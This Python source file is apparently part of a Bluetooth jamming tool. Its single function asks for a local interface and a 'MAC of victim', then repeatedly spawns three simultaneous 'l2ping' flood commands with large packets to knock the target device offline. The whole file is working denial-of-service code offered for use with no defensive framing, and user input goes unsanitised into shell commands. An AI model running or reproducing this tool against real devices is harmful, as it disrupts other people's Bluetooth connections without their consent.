import subprocess
import headers

def no_gui():
    try:
        print("No GUI Version")
        print(" ")
        interface = input("Your BT interface : ")
        mac = input("MAC of victim: ")
        time = 999
        print("Start jamming...")
        delay = int(time)

        while delay != 0:
            xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
            xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
            xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
            subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            delay -= 1
    except OSError:
        print("done")